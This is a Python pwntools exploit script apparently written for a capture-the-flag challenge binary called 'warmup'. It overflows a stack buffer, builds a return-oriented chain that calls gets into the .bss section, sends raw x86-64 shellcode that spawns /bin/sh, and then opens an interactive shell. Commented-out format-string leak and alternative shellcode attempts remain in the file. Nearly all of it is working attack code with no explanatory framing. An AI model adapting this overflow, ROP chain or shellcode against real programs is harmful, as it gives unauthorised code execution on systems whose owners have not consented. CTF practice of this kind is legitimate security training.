#!/usr/bin/env python2
from pwn import *
import binascii
import sys

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def send_fmt_str(payload):
    log.info("payload = %s" % repr(payload))
    io.sendline(payload)

def pwn():
    # skip over the prompt
    io.readuntil(':)\n')

    #Setup debugger
    # gdb.attach(io,
    #           '''
    #            break *000400590
    #           c
    #           ''')
    gdb.attach(io)

    # Recovered main address using disassembly
    main_addr = 0x04006ba

    # Buffer overflow :D
    # payload = '%4$lx....'
    # payload += '%lx....'
    # payload += '%lx....'
    # payload += '%lx....'
    # payload += '%lx....'
    # payload += '%lx....'
    # payload += '%lx....'
    # payload = payload.ljust(0x100, 'B') # Pad to overflow

    # # setup a ret2main
    # payload += p64(0xdeadbeef) # fake base pointer
    # payload += p64(main_addr) # Return to start of main

    payload = "A" * 0x108
    # Put the address of the .bss as the first argument
    payload += p64(pop_rdi)
    payload += p64(elf.bss(0x400))
    # Call gets(.bss)
    payload += p64(elf.plt['gets'])
    # ret2.bss
    payload += p64(elf.bss(0x400))

    io.sendline(payload)
    log.info("Setup ret2gets")
    log.info("Gets is at {} in the plt".format(elf.plt['gets']))

    # TODO fix up
    # io.recv(4) # skip leading A's
    # response = io.recvuntil('.') # get leak
    # response = response[:-1] # drop trailing byte

    # # Formatting stuff...
    # response = '0000' + response
    # hex_response = binascii.unhexlify(response)
    # hex_response = response.decode('hex')

    # response = io.recvuntil('.')[:-1] # Trim trailing 
    # log.info('Stack is at: ' + response)
    # saved_rsp = int(response,16)
    # ret_address =  saved_rsp + 0x110 # move  to middle of stack
    # log.info('going to return to: ' + hex(ret_address))

    # io.recvuntil(':)\n')

    # log.info("format string time")

    # Round 2. Send shellcode payload.
    # payload = shellcraft.amd64.linux.sh()
    # payload = "6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05"
    # payload = enhex(asm(shellcraft.sh()))
    # payload = '\x90' * 0x50
    # payload += '\xcc' * 0x50
    # payload += p64(0x13371337)
    # payload += p64(0x13371337)
    payload = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

    io.sendline(payload)

    io.interactive()

pop_rdi = 0x00400773
io = process('./warmup')
# io = remote('nothing.chal.ctf.westerns.tokyo', 10001)
elf = ELF('./warmup')
if __name__ == '__main__':
    pwn()
